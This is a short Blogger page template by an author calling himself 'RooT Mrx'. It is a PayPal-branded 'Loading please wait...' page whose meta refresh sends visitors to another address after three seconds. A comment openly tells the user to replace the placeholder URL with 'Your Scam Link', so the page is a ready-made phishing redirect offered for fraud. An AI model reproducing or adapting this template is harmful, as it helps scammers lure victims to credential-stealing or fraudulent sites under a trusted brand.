<!DOCTYPE html>
<!--
[+]S3ib Tkon #Rajl 
[-]Sahel Tkon #Wld_Nas !
   Mohim Kmal mn 3ndk...
   
Follow us :
         - Our Blog    => http://root-mrx.tk
         - On YouTube  => https://goo.gl/5mKgbV
         - My Email    => data43toko@gmail.com
-->
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='https://www.paypalobjects.com/webstatic/icon/favicon.ico' rel='icon' type='image/x-icon'/>

<!-- Please Change "https://google.com" To Your Scam Link !! -->
<meta http-equiv="refresh" content="3;URL='https://google.com'" />

<meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
<b:if cond='data:blog.isMobile'>
<meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/>
<b:else/>
<meta content='width=1100' name='viewport'/>
</b:if>
<b:include data='blog' name='all-head-content'/>

<title>Loading please wait...</title>
<b:skin><![CDATA[/*
    -----------------------------------------------
     By RooT Mrx
    ----------------------------------------------- */
    ]]></b:skin>
</head>
<body>

<b:section class='navbar' id='navbar' maxwidgets='1' showaddelement='no'>
<b:widget id='Navbar1' locked='true' title='Navbar' type='Navbar'/>
</b:section>

<h3>Loading please wait...</h3>
           
</body>
</html>